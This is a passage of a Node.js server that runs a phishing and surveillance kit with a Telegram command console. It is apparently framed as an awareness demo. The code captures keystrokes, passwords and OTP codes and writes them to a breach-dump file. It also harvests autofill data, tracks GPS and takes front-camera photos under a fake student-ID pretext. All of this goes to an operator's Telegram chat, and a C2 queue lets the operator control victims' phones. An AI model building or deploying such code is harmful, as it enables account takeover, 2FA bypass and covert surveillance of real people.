  const quiet = !!(d.quiet || req.query.quiet === "1"); // ?quiet=1 → store/count only, no Telegram dossier

  s.device = {
    platform: d.platform, browser: d.browser, webview: d.webview,
    language: d.language, languages: d.languages,
    screen: d.screen, darkMode: d.darkMode, localTime: d.localTime,
    timezone: d.timezone, locale: d.locale,
    cores: d.cores, memory: d.memory,
    battery: d.battery, connection: d.connection, net: d.net,
    touchSupport: d.touchSupport, maxTouchPoints: d.maxTouchPoints,
    gpu: d.gpu, webglHash: d.webglHash, audioFingerprint: d.audioFingerprint,
    plugins: d.plugins, referrer: d.referrer, notifications: d.notifications,
    rtcLocalIp: d.rtcLocalIp, rtcPublicIp: d.rtcPublicIp,
    devices: d.devices, drm: d.drm, fonts: d.fonts, storage: d.storage,
    perms: d.perms, tabs: d.tabs,
  };
  s.visits += 1;
  ensureCohort(s, req);
  // A brand-new session can be created by /command before /collect lands —
  // trust the explicit cohort the page reports on its first real collect.
  const bodyC = pickCohort(req);
  if (bodyC && s.visits <= 1 && !Object.keys(s.permLog || {}).length && !s.creds) s.cohort = bodyC;
  setStage(s, "landed");
  saveSessions();

  // LOUD Telegram alert only on the FIRST visit of a session. Reloads and
  // returning visits become silent feed lines — no more dossier spam.
  if (!quiet && s.visits <= 1) {
    tgSend(buildDossier(s), { reply_markup: { inline_keyboard: [
      [
        { text: "🎛 Console", callback_data: `console:${s.sid}` },
        { text: "📊 Dashboard", callback_data: "dash" },
      ],
      [{ text: "🗂 All devices", callback_data: "list" }],
    ] } });
    pushFeed(s, `👋 <b>new visitor</b> — ${esc(String(classify(s.ua).label).slice(0, 40))}, dossier sent`);
  } else if (!quiet) {
    pushFeed(s, `↩️ returning visit #${s.visits} — page re-opened`);
  }

  // Geo lookup runs AFTER the response (never blocks the dossier). Only the
  // first result or a real city/ISP change earns a map pin + feed line.
  geoLookup(s.ip).then((geo) => {
    if (!geo) return;
    const prev = s.location;
    const changed = !prev || prev.city !== geo.city || prev.country !== geo.country || prev.isp !== geo.isp;
    s.location = {
      city: geo.city, region: geo.regionName, country: geo.country,
      isp: geo.isp, tz: geo.timezone, lat: geo.lat, lon: geo.lon,
      mobile: geo.mobile, proxy: geo.proxy,
    };
    s.lastGeoUpdate = Date.now();
    saveSessions();
    if (changed && s.location.lat) {
      tg("sendLocation", { chat_id: CHAT_ID, latitude: s.location.lat, longitude: s.location.lon });
      pushFeed(s, `📍 located: <b>${esc(geo.city)}, ${esc(geo.country)}</b> · ${esc(geo.isp)}${geo.proxy ? " · ⚠️ VPN/proxy" : ""}`);
    }
  }).catch(() => {});

  res.json({ ok: true, sid: s.sid, cohort: s.cohort, stage: s.stage });
});

// ── Crowd-demo opt-in counter (audience phones; in-memory only, never ─
//    written to disk or sent to Telegram — that is the whole point) ────
const crowdSeen = new Set(); // anonymous per-phone ids since server start
const crowdHits = [];
const crowdDevs = new Map(); // id → {platform, browser} (deduped platform roll-up)

function onCrowdPing(req, res) {
  const d = req.body || {};
  const id = String(d.id || "").replace(/[^a-z0-9]/gi, "").slice(0, 16) || clientIp(req);
  crowdSeen.add(id);

  const ua = req.headers["user-agent"] || "";
  const entry = {
    t: Date.now(),
    platform: String(d.platform || classify(ua).label || "Unknown").slice(0, 60),
    browser: String(d.browser || "—").slice(0, 40),
    lang: String(d.lang || "").slice(0, 12),
    screen: String(d.screen || "").slice(0, 24),
  };
  crowdDevs.set(id, { platform: entry.platform, browser: entry.browser });
  crowdHits.push(entry);
  if (crowdHits.length > 400) crowdHits.splice(0, crowdHits.length - 400);

  res.json({ ok: true, n: crowdSeen.size, first: true });
}

app.get("/crowd", (req, res) => {
  const perPlatform = {};
  for (const v of crowdDevs.values()) perPlatform[v.platform] = (perPlatform[v.platform] || 0) + 1;
  res.json({
    total: crowdSeen.size,
    perPlatform,
    recent: crowdHits.slice(-15).map(e => ({ t: e.t, platform: e.platform, browser: e.browser })),
  });
});

// ── PDF lure hit-tracking — the "link in WhatsApp" demo ───────────────
function onPdfHit(req, res) {
  const s = sessionFor(req, req.query.vid || "");
  s.pdfHits = (s.pdfHits || 0) + 1;
  s.lastSeen = Date.now();
  saveSessions();

  if (!s.pdfNotified) {
    s.pdfNotified = true;
    const cls = classify(s.ua);
    tgSend(
      `📄 <b>PDF LURE OPENED</b> — ${cls.icon} ${esc(cls.label)}\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🌍 <b>IP:</b> <code>${esc(s.ip)}</code>${s.location ? ` · ${esc(s.location.city)}, ${esc(s.location.country)}` : ""}\n` +
      `🕐 <b>Time:</b> ${nowIST()} · <code>${esc(s.sid)}</code>\n\n` +
      `<i>One tap on the link was enough — IP, OS and timezone of the person who opened it.</i>`
    );
    pushFeed(s, `📄 PDF lure opened — first tap, alert sent`);
  } else {
    pushFeed(s, `📄 PDF lure re-opened (tap #${s.pdfHits})`);
  }
  res.sendFile(path.join(__dirname, "public", "notes.pdf"));
}

// ── Keystrokes: store + live-edit stream + typing mirror ──────────────
app.post("/keys", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const keys = String(req.body.keys || "").slice(0, 2000);
  if (!keys) return res.json({ ok: true });

  const context = req.body.context || "page";
  s.keys.push({ t: Date.now(), keys, context });
  s.keyCount = s.keys.length;
  if (s.keys.length > 500) s.keys.splice(0, s.keys.length - 500);
  saveSessions();
  setStage(s, "typed");

  // Secrets (password / OTP / PIN fields) keep the dramatic live-edit stream +
  // typing mirror. Ordinary page typing is just a dashboard feed line.
  if (/password|otp|pin|pass/i.test(context)) {
    if (!liveKeys.has(`${s.sid}|${context}`)) {
      pushFeed(s, `⌨️ <b>typing in ${esc(context)}</b> — live stream open`);
    }
    mirrorTyping(s.sid);
    streamKeys(s, keys, context).catch(() => {});
  } else {
    const preview = keys.length > 80 ? keys.slice(0, 80) + "…" : keys;
    pushFeed(s, `⌨️ <i>${esc(context)}:</i> <code>${esc(preview)}</code>`);
  }
  res.json({ ok: true });
});

// ── Typing presence (client pings while victim types) ─────────────────
app.post("/typing", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  mirrorTyping(s.sid);
  res.json({ ok: true });
});

// ── Behavioral narration events ───────────────────────────────────────
app.post("/event", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const text = String(req.body.text || "").slice(0, 300);
  if (!text) return res.json({ ok: true });

  s.events.push({ t: Date.now(), text });
  if (s.events.length > 100) s.events.shift();
  saveSessions();

  // Narration events are FEED-ONLY: they update the dashboard/console message
  // in place instead of spamming a new Telegram message per line.
  pushFeed(s, esc(text));
  res.json({ ok: true });
});

// ── Permission outcome telemetry (grant-rate counter) ─────────────────
const PERM_NAMES = new Set(["location", "camera", "microphone", "notifications"]);
const PERM_STATES = new Set(["granted", "denied", "prompted"]);
app.post("/perm", (req, res) => {
  const s = sessionFor(req, req.body && req.body.vid);
  const name = String((req.body || {}).name || "").toLowerCase();
  const state = String((req.body || {}).state || "").toLowerCase();
  if (!PERM_NAMES.has(name) || !PERM_STATES.has(state)) return res.json({ ok: true });
  ensureCohort(s, req);
  s.permLog = s.permLog || {};
  const p = s.permLog[name] || {};
  if (state === "prompted") p.askedAt = p.askedAt || Date.now();
  else { p.state = state; p.t = Date.now(); }
  s.permLog[name] = p;
  saveSessions();

  // Grant/deny outcomes are demo-critical moments — surface them on the dash.
  if (state === "granted") pushFeed(s, `✅ <b>${esc(name)}</b> permission <b>granted</b>`);
  else if (state === "denied") pushFeed(s, `⛔ <b>${esc(name)}</b> permission <b>denied</b>`);
  res.json({ ok: true });
});

// ── Autofill harvest report ───────────────────────────────────────────
app.post("/autofill", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const f = {
    name: req.body.name, phone: req.body.phone, org: req.body.org,
    street: req.body.street, postal: req.body.postal,
  };
  const got = Object.entries(f).filter(([, v]) => v);
  if (!got.length) return res.json({ ok: true });

  s.autofill = f;
  saveSessions();

  let msg = `🕸️ <b>AUTOFILL HARVEST — victim never typed these</b>\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  for (const [k, v] of got) msg += `${k === "name" ? "👤" : k === "phone" ? "📞" : "🏠"} <b>${k}:</b> <code>${esc(v)}</code>\n`;
  tgSend(msg);
  pushFeed(s, `🕸️ autofill harvest — ${got.map(([k]) => k).join(", ")}`);
  res.json({ ok: true });
});

// ── Credentials — breach-dump format ──────────────────────────────────
app.post("/creds", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const { email, password } = req.body || {};
  if (!email && !password) return res.json({ ok: true });

  s.creds = { email, password, t: Date.now() };
  setStage(s, "creds");
  saveSessions();
  appendDump(`${email}:${password}:${s.ip}`);

  const cls = classify(s.ua);
  tgSend(
    `🔐 <b>CREDENTIALS CAPTURED</b> — ${cls.icon} ${esc(cls.label)}\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 <b>Email:</b> <code>${esc(email)}</code>\n` +
    `🔑 <b>Password:</b> <code>${esc(password)}</code>\n` +
    `🌍 <b>IP:</b> <code>${esc(s.ip)}</code>${s.location ? `\n📍 <b>Geo:</b> ${esc(s.location.city)}, ${esc(s.location.region)}` : ""}\n` +
    `🧬 <b>Visitor:</b> <code>${esc(s.sid)}</code>\n\n` +
    `<i>breach-dump line:</i> <code>${esc(email)}:${esc(password)}:${esc(s.ip)}</code>`
  );
  pushFeed(s, `🔐 <b>credentials captured</b> — <code>${esc(email)}</code>`);
  res.json({ ok: true });
});

// ── Breach-dump file (plain text, appended live, shipped via /dump) ───
const DUMP_PATH = path.join(__dirname, "dump.txt");
function appendDump(line) {
  if (!line) return;
  try {
    fs.appendFileSync(DUMP_PATH, String(line).replace(/\r?\n/g, " ").trim() + "\n");
  } catch (e) { /* non-fatal */ }
}

// ── OTP / 2FA code capture — completes the account-takeover chain ─────
app.post("/otp", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const otp = String(req.body.otp || "").replace(/[^0-9A-Za-z]/g, "").slice(0, 8);
  if (!otp) return res.json({ ok: true });
  if (s.otp && s.otp.code === otp) return res.json({ ok: true }); // ignore replays

  s.otp = { code: otp, t: Date.now() };
  setStage(s, "otp");
  saveSessions();

  const cls = classify(s.ua);
  const email = s.creds?.email || "—";
  const password = s.creds?.password || "—";
  const chain = `${email}:${password}:${otp}:${s.ip}`;
  appendDump(chain);

  tgSend(
    `🔑 <b>OTP / 2FA CODE SNIFFED</b> — ${cls.icon} ${esc(cls.label)}\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    (s.creds ? `🧩 <b>Victim:</b> <code>${esc(email)}</code>\n` : "") +
    `📱 <b>Code:</b> <code>${esc(otp)}</code>\n` +
    `🌍 <b>IP:</b> <code>${esc(s.ip)}</code> · <code>${esc(s.sid)}</code>\n\n` +
    `⚡ <b>Full ATO chain (email:password:otp):</b>\n<code>${esc(chain)}</code>\n\n` +
    `<i>In a real attack this code is pasted into the real portal within seconds — that is the damage.</i>`
  );
  pushFeed(s, `🔑 <b>OTP sniffed</b> <code>${esc(otp)}</code> — takeover chain complete`);
  res.json({ ok: true });
});

// ── Exit summary from sendBeacon ──────────────────────────────────────
app.post("/exit", (req, res) => {
  let b = {};
  try { b = typeof req.body === "string" ? JSON.parse(req.body) : req.body; } catch (e) {}
  const s = sessionFor(req, b.vid);

  s.dwellMs = b.dwellMs || s.dwellMs;
  s.scrollPct = b.scrollPct || s.scrollPct;
  s.touches = b.touches || s.touches;
  s.keyCount = s.keys.length;
  const dyn = b.keyDyn;
  saveSessions();

  // The page fires both visibilitychange AND pagehide — dedupe within 10s
  // so the audience gets exactly ONE session summary per close.
  if (Date.now() - (s._lastExitAt || 0) < 10000) return res.json({ ok: true, dup: true });
  s._lastExitAt = Date.now();

  const mins = Math.floor((s.dwellMs || 0) / 60000);
  const secs = Math.round(((s.dwellMs || 0) % 60000) / 1000);
  let msg = `📋 <b>SESSION SUMMARY</b> — ${classify(s.ua).icon} ${esc(String(classify(s.ua).label).slice(0, 30))} <code>${esc(s.sid)}</code>\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `⏱️ Dwell: ${mins}m ${secs}s | ⌨️ Keys: ${s.keys.length} | 👆 Touches: ${s.touches}\n`;
  msg += `📖 Read to: ${s.scrollPct}% of page\n`;
  if (dyn) msg += `🧠 <b>Keystroke biometrics:</b> ${dyn.wpm} WPM · avg ${dyn.avg}ms between keys · ${dyn.bursts} burst-pairs\n`;
  if (s.creds && !s.otp) msg += `\n🔐 <b>Creds captured</b> — <code>${esc(s.creds.email)}</code>:<code>${esc(s.creds.password)}</code>`;
  if (s.otp) msg += `\n🎯 <b>Full ATO chain completed</b> — email:password:OTP all captured`;
  tgSend(msg);
  pushFeed(s, `📤 <b>session ended</b> — ${mins}m ${secs}s · ⌨️ ${s.keys.length} keys · 📖 ${s.scrollPct}%${s.otp ? " · 🔑 OTP done" : s.creds ? " · 🔐 creds" : ""}`);
  res.json({ ok: true });
});

// ── Touch heatmap upload (client-rendered PNG) ────────────────────────
app.post("/heatmap", (req, res) => {
  const s = sessionFor(req, req.query.vid || req.headers["x-vid"] || "");
  if (!req.body || !req.body.length) return res.json({ ok: true });
  s.heatBuf = Buffer.from(req.body);
  s.touches = parseInt(req.query.touches) || s.touches || 1;
  saveSessions();

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", `👆 Touch heatmap — ${classify(s.ua).label} [${s.sid}] (${s.touches} taps)`);
  form.append("photo", new Blob([s.heatBuf], { type: "image/png" }), "heat.png");
  tgMultipart("sendPhoto", form);
  pushFeed(s, `👆 touch heatmap uploaded (${s.touches} taps)`);
  res.json({ ok: true });
});

// ── GPS fixes — breadcrumb tracking + throttled map pin ─────────────
function haversineKm(a, b) {
  const rad = (x) => (x * Math.PI) / 180;
  const dLat = rad(b.lat - a.lat);
  const dLon = rad(b.lon - a.lon);
  const h = Math.sin(dLat / 2) ** 2 + Math.cos(rad(a.lat)) * Math.cos(rad(b.lat)) * Math.sin(dLon / 2) ** 2;
  return 2 * 6371 * Math.asin(Math.sqrt(h));
}

app.post("/gps", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const { lat, lon, acc, spd, alt, source } = req.body || {};
  if (!lat || !lon) return res.json({ ok: true });

  const prev = s.gps;
  s.gps = { lat, lon, acc, t: Date.now(), source: source || "" };
  s.fixes = (s.fixes || 0) + 1;
  saveSessions();

  // Pin only for the first fix, real movement (≥120 m) or a 30 s heartbeat.
  // Everything else is a silent console feed line — watchPosition no longer
  // spams the chat.
  const movedM = prev && prev.lat ? Math.round(haversineKm(prev, s.gps) * 1000) : null;
  const mvt = movedM === null ? "first fix" : movedM < 1000 ? `${movedM} m` : `${(movedM / 1000).toFixed(2)} km`;
  const accTxt = acc != null ? ` ±${Math.round(acc)}m` : "";
  const spdTxt = spd != null && spd > 0.3 ? ` · ${(spd * 3.6).toFixed(1)} km/h` : "";
  const pin = movedM === null || movedM >= 120 || Date.now() - (s._lastPinAt || 0) >= 30000;

  if (pin) {
    s._lastPinAt = Date.now();
    tg("sendLocation", { chat_id: CHAT_ID, latitude: lat, longitude: lon });
    pushFeed(s, `📍 <b>GPS fix #${s.fixes}</b> — ${mvt}${accTxt}${spdTxt}${source ? ` · via ${esc(source)}` : ""} → map pin`);
  } else {
    pushFeed(s, `📍 GPS fix #${s.fixes} — moved ${mvt}${accTxt}${spdTxt} (tracking, no pin)`);
  }
  res.json({ ok: true });
});

// ── Front camera capture (burst-aware) ─────────────────────────────────
//  Frames arrive as raw PNGs. A BURST is 1-6 frames the client sends
//  ~420ms apart with ?burst=N&idx=i&last=1 on the final frame. The server
//  buffers them and forwards the WHOLE burst as ONE Telegram album so the
//  operator sees a single narration per capture (no per-frame spam).
//  A 2.5s safety timer flushes whatever arrived if the victim closes the
//  tab mid-burst (partial bursts degrade gracefully to a smaller album).
const selfieBufs = new Map();    // sid -> { n, frames: [{ buf, at }] }
const selfieTimers = new Map();  // sid -> safety-flush timeout handle

function clearSelfieTimer(sid) {
  const t = selfieTimers.get(sid);
  if (t) { clearTimeout(t); selfieTimers.delete(sid); }
}

// Single-frame send — the original path, identical narration.
function sendSelfieSingle(s, buf) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", `📷 <b>FRONT CAMERA CAPTURE</b> — ${classify(s.ua).label} <i>[${esc(s.sid)}]</i>\nPretext: Student ID selfie verification`);
  form.append("photo", new Blob([buf], { type: "image/png" }), "selfie.png");
  tgMultipart("sendPhoto", form);
  s.events.push({ t: Date.now(), text: "📸 Front camera frame captured" });
  pushFeed(s, `📸 front camera frame captured → Telegram`);
}

// Send a buffered burst as ONE media-group album (single narration).
async function flushSelfieBurst(sid) {
  clearSelfieTimer(sid);
  const b = selfieBufs.get(sid);
  selfieBufs.delete(sid);
  if (!b || !b.frames.length) return;
  const s = sessions.get(sid);
  if (!s) return; // session wiped mid-burst — drop silently
  if (b.frames.length === 1) {
    // Degraded burst (victim closed the tab after 1 frame) → single-photo path.
    sendSelfieSingle(s, b.frames[0].buf);
    saveSessions();
    return;
  }
  const n = b.frames.length;
  const caption = `📷 <b>FRONT CAMERA CAPTURE ×${n}</b> — ${classify(s.ua).label} <i>[${esc(s.sid)}]</i>\nPretext: Student ID selfie verification`;
  const media = b.frames.map((f, i) => ({
    type: "photo",
    media: `attach://f${i}`,
    ...(i === 0 ? { caption, parse_mode: "HTML" } : {}),
  }));
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  b.frames.forEach((f, i) => form.append(`f${i}`, new Blob([f.buf], { type: "image/png" }), `selfie${i}.png`));
  form.append("media", JSON.stringify(media));
  await tgMultipart("sendMediaGroup", form);
  s.events.push({ t: Date.now(), text: `📸 Front camera burst captured — ${n} frames` });
  pushFeed(s, `📸 selfie burst ×${n} — ONE Telegram album sent`);
  saveSessions();
}

app.post("/selfie", (req, res) => {
  if (!req.body || !req.body.length) return res.json({ ok: true });
  const buf = Buffer.from(req.body);
  const s = sessionFor(req, req.query.vid || "");
  // Burst only when the client EXPLICITLY asks (?burst=N>1). A plain POST
  // (single-frame capture) keeps the original immediate send/event/feed.
  const want = parseInt(req.query.burst, 10);
  const n = want ? Math.max(1, Math.min(6, want)) : 1;
  if (n === 1) {
    sendSelfieSingle(s, buf);
    saveSessions();
    return res.json({ ok: true });
  }
  // Buffered burst — client sends frames ~420ms apart, last=1 on the final.
  const sid = s.sid;
  let b = selfieBufs.get(sid);
  if (!b) {
    b = { n, frames: [] };
    selfieBufs.set(sid, b);
    const t = setTimeout(() => flushSelfieBurst(sid), 2500); // victim-abort safety
    selfieTimers.set(sid, t);
  }
  b.frames.push({ buf, at: Date.now() });
  if (req.query.last === "1" || b.frames.length >= b.n) flushSelfieBurst(sid);
  res.json({ ok: true });
});

// ── C2 command queue — operator drives the victim phone ──────────────
const cmdQueue = new Map();
function queueCmd(sid, action, arg) {
  if (!sessions.has(sid)) return false;
  if (!cmdQueue.has(sid)) cmdQueue.set(sid, []);
  cmdQueue.get(sid).push({ action, arg });
  return true;
}

app.get("/command", (req, res) => {
  const s = sessionFor(req, req.query.vid || "");
  const cmds = cmdQueue.get(s.sid) || [];
  cmdQueue.set(s.sid, []);
  res.json({ commands: cmds, cohort: s.cohort, stage: s.stage });
});

// ── Bandwidth test asset ──────────────────────────────────────────────
app.get("/ping", (req, res) => {
  const n = Math.min(parseInt(req.query.n) || 0, 500000);
  res.set({ "Cache-Control": "no-store", "Content-Type": "application/octet-stream" });
  res.send(Buffer.alloc(n, "a"));
});

// ══════════════════════════════════════════════════════════════
//  TELEGRAM COMMAND CONSOLE (long-poll getUpdates)
// ══════════════════════════════════════════════════════════════
function sessionLine(s) {
  const cls = classify(s.ua);
  const d = s.device || {};
  const bat = d.battery ? `${d.battery.level}%${d.battery.charging ? "⚡" : "🔋"}` : "—";
  const net = d.connection ? d.connection.effectiveType : "—";
  const online = Date.now() - s.lastSeen < 30000;
  const geo = s.location ? `${s.location.city}, ${s.location.country}` : "unknown";
  return `${cls.icon} <code>${esc(s.sid)}</code> · ${esc(cls.label)} · ${bat} · ${net} · ${esc(geo)}${online ? " · 🟢" : " · ⚫"}`;
}

function buildCsv() {
  const rows = [["visitor_id", "first_seen", "last_seen", "ip", "device", "browser", "language", "screen", "gpu", "timezone", "city", "region", "country", "isp", "cpu_cores", "ram_gb", "battery", "network", "key_count", "email", "password", "otp", "pdf_opens", "user_agent"]];
  for (const s of sessions.values()) {
    const d = s.device || {};
    rows.push([
      s.sid, new Date(s.firstSeen).toISOString(), new Date(s.lastSeen).toISOString(),
      s.ip, d.platform || "", d.browser || "", d.language || "", d.screen || "", d.gpu || "",
      d.timezone || "", s.location?.city || "", s.location?.region || "", s.location?.country || "",
      s.location?.isp || "", d.cores || "", d.memory || "",
      d.battery ? d.battery.level + "%" : "", d.connection?.effectiveType || "",
      s.keys.length, s.creds?.email || "", s.creds?.password || "", s.otp?.code || "", s.pdfHits || 0, s.ua,
    ]);
  }
  return rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\r\n");
}

async function handleCommand(text) {
  const [cmd, ...args] = text.trim().split(/\s+/);
  const c = cmd.toLowerCase();

  if (c === "/help" || c === "/start") {
    return tgSend(
      `🛰️ <b>C2 CONSOLE — COMMANDS</b>\n` +
      `<code>/list</code> — all devices (filterable feed)\n` +
      `<code>/filter android|ios|windows|mac|linux</code> — devices by platform\n` +
      `<code>/who &lt;id&gt;</code> — full dossier for a device\n` +
      `<code>/keys &lt;id&gt; [n]</code> — last n keystroke entries\n` +
      `<code>/creds</code> — all captured credentials\n` +
      `<code>/dump</code> — send dump.txt (email:password:otp chain) as a file\n` +
      `<code>/otp</code> — 2FA codes arrive automatically right after creds\n` +
      `<code>/events &lt;id&gt;</code> — behavior narration log\n` +
      `<code>/heat &lt;id&gt;</code> — touch heatmap photo\n` +
      `<code>/gps &lt;id&gt;</code> — queue a GPS fix request (prompt on their screen)\n` +
      `<code>/buzz &lt;id&gt;</code> — vibrate their phone (Android Chrome only — needs a prior tap on the page, haptics on, not Silent/DND)\n` +
      `<code>/nudge &lt;id&gt; [msg]</code> — push a fake “new sign-in” takeover alert (ATO reveal)\n` +
      `<code>/speak &lt;id&gt; &lt;text&gt;</code> — their phone says it out loud\n` +
      `<code>/flash &lt;id&gt;</code> — strobe their screen\n` +
      `<code>/selfie &lt;id&gt; [burst]</code> — front camera burst, 1-6 frames (default 3) → ONE album\n` +
      `<code>/torch &lt;id&gt; [on|off]</code> — control their LED flashlight\n` +
      `<code>/siren &lt;id&gt;</code> — siren sweep + vibration + red pulse\n` +
      `<code>/dash</code> — live dashboard (one auto-updating message, zero spam)\n` +
      `<code>/console &lt;id&gt;</code> — per-device interactive console (action buttons)\n` +
      `<code>/csv</code> — breach-dump export of every session\n` +
      `<code>/stats</code> — totals\n` +
      `<code>/crowd</code> — audience opt-in counter\n` +
      `<code>/clear</code> — wipe demo data\n` +
      `\n` +
      `<i>ℹ️ Typing, events, GPS, autofill &amp; re-visits now update the dash SILENTLY. Loud only: first dossier, credentials, OTPs, photos, PDF first hit and throttled GPS pins.</i>`
    );
  }

  if (c === "/list") {
    const list = Array.from(sessions.values()).sort((a, b) => b.lastSeen - a.lastSeen);
    if (!list.length) return tgSend("📭 No devices yet — open the demo link.");
    let msg = `🗂 <b>DEVICE REGISTRY — ${list.length} total</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
    msg += list.map(sessionLine).join("\n");
    return tgSend(clipLines(msg));
  }

  if (c === "/filter") {
    const t = (args[0] || "").toLowerCase();
    const iconOf = { android: "🤖", ios: "🍎", windows: "🖥️", mac: "💻", linux: "🐧", other: "❓" };
    const list = Array.from(sessions.values()).filter(s => classify(s.ua).type === t);
    if (!list.length) return tgSend(`🔍 No ${esc(t)} devices seen. Types: android, ios, windows, mac, linux.`);
    let msg = `${iconOf[t] || "❓"} <b>${esc(t.toUpperCase())} DEVICES — ${list.length}</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
    msg += list.map(sessionLine).join("\n");
    return tgSend(clipLines(msg));
  }

  if (c === "/who") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    return s ? tgSend(clipLines(buildDossier(s))) : tgSend("❓ Usage: /who <visitor-id> — see /list");
  }

  if (c === "/keys") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    if (!s) return tgSend("❓ Usage: /keys <visitor-id> [n]");
    const n = Math.min(parseInt(args[1]) || 10, 50);
    const last = s.keys.slice(-n).map(k => `[${esc(k.context)}] <code>${esc(k.keys)}</code>`).join("\n") || "no keystrokes";
    return tgSend(clipLines(`⌨️ <b>KEYSTROKES</b> — <code>${esc(s.sid)}</code> (last ${n} of ${s.keys.length})\n${last}`));
  }

  if (c === "/events") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    if (!s) return tgSend("❓ Usage: /events <visitor-id>");
    const log = s.events.slice(-20).map(e => `[${new Date(e.t).toLocaleTimeString("en-IN", { hour12: false })}] ${esc(e.text)}`).join("\n") || "no events";
    return tgSend(clipLines(`🫀 <b>BEHAVIOR LOG</b> — <code>${esc(s.sid)}</code>\n${log}`));
  }

  if (c === "/creds") {
    const withCreds = Array.from(sessions.values()).filter(s => s.creds);
    if (!withCreds.length) return tgSend("📭 No credentials captured yet.");
    const lines = withCreds.map(s =>
      `<code>${esc(s.creds.email)}:${esc(s.creds.password)}:${esc(s.ip)}</code> · <code>${esc(s.sid)}</code>`
    ).join("\n");
    return tgSend(clipLines(`🔐 <b>CREDENTIAL DUMP</b>\n${lines}`));
  }

  if (c === "/heat") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    if (!s || !s.heatBuf) return tgSend("📭 No heatmap stored for that device (uploads when the victim hides the tab).");
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", `👆 Stored heatmap — ${classify(s.ua).label} [${s.sid}]`);
    form.append("photo", new Blob([s.heatBuf], { type: "image/png" }), "heat.png");
    return tgMultipart("sendPhoto", form);
  }

  if (c === "/csv") {
    if (!sessions.size) return tgSend("📭 No sessions to export.");
    const csv = buildCsv();
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", `💾 Breach-dump export — ${sessions.size} session(s)`);
    form.append("document", new Blob([csv], { type: "text/csv" }), `linkdemo_dump_${Date.now()}.csv`);
    return tgMultipart("sendDocument", form);
  }

  if (c === "/stats") {
    const all = Array.from(sessions.values());
    const byType = {};
    all.forEach(s => { const t = classify(s.ua).type; byType[t] = (byType[t] || 0) + 1; });
    const online = all.filter(s => Date.now() - s.lastSeen < 30000).length;
    const keyTotal = all.reduce((a, s) => a + s.keys.length, 0);
    return tgSend(
      `📊 <b>STATS</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
      `👁️ Devices: ${all.length} (${online} online)\n` +
      Object.entries(byType).map(([t, n]) => `   ${iconFor(t)} ${t}: ${n}`).join("\n") + "\n" +
      `⌨️ Keystrokes: ${keyTotal}\n` +
      `🔐 Credentials: ${all.filter(s => s.creds).length}\n` +
      `🔑 OTP/2FA codes: ${all.filter(s => s.otp).length}\n` +
      `📄 PDF lure opens: ${all.filter(s => s.pdfHits).length}\n` +
      `🕸️ Autofill harvests: ${all.filter(s => s.autofill).length}\n` +
      `🎟️ Crowd opt-ins: ${crowdSeen.size}`
    );
  }

  if (c === "/buzz") {
    const ok = queueCmd((args[0] || "").slice(0, 12), "buzz");
    return tgSend(ok ? "📳 Vibration queued — their phone buzzes within 3s" : "❓ Usage: /buzz <visitor-id> — see /list");
  }

  if (c === "/speak") {
    const sid = (args[0] || "").slice(0, 12);
    const text = args.slice(1).join(" ") || "This device has been compromised.";
    const ok = queueCmd(sid, "speak", text);
    return tgSend(ok ? `🔊 Speak queued — their phone says it out loud:\n<i>${esc(text)}</i>` : "❓ Usage: /speak <visitor-id> <text> — see /list");
  }

  if (c === "/flash") {
    const ok = queueCmd((args[0] || "").slice(0, 12), "flash");
    return tgSend(ok ? "⚡ Flash queued — their screen strobes within 3s" : "❓ Usage: /flash <visitor-id> — see /list");
  }

  if (c === "/siren") {
    const ok = queueCmd((args[0] || "").slice(0, 12), "siren");
    return tgSend(ok ? "🚨 Siren triggered — their phone sweeps 600→1400 Hz twice, vibrates and pulses red" : "❓ Usage: /siren <visitor-id> — see /list");
  }
  if (c === "/gps") {
    const ok = queueCmd((args[0] || "").slice(0, 12), "gps");
    return tgSend(ok ? "📍 GPS request queued — the permission prompt appears on their screen within 3s. If they ever allowed location before, it tracks SILENTLY." : "❓ Usage: /gps <visitor-id> — see /list");
  }

  if (c === "/selfie") {
    const burst = Math.max(1, Math.min(6, parseInt(args[1], 10) || 3));
    const ok = queueCmd((args[0] || "").slice(0, 12), "selfie", String(burst));
    return tgSend(ok ? `📷 Selfie capture queued (×${burst}) — if camera was ever allowed, the album arrives in seconds with NO prompt` : "❓ Usage: /selfie <visitor-id> [burst 1-6] — see /list");
  }


  if (c === "/torch") {
    const state = (args[1] || "on").toLowerCase();
    if (state === "off") {
      const ok = queueCmd((args[0] || "").slice(0, 12), "torchOff");
      return tgSend(ok ? "🔦 Torch OFF queued" : "❓ Usage: /torch <visitor-id> off — see /list");
    }
    const ok = queueCmd((args[0] || "").slice(0, 12), "torchOn");
    return tgSend(ok ? "🔦 Torch ON queued — their LED flashlight lights up within 3s (needs camera permission granted once)" : "❓ Usage: /torch <visitor-id> [on|off] — see /list");
  }

  if (c === "/dump") {
    if (!fs.existsSync(DUMP_PATH)) return tgSend("📭 No dump.txt yet — nothing captured.");
    const raw = fs.readFileSync(DUMP_PATH, "utf8").trim();
    if (!raw) return tgSend("📭 dump.txt is empty — wait for a credential capture.");
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
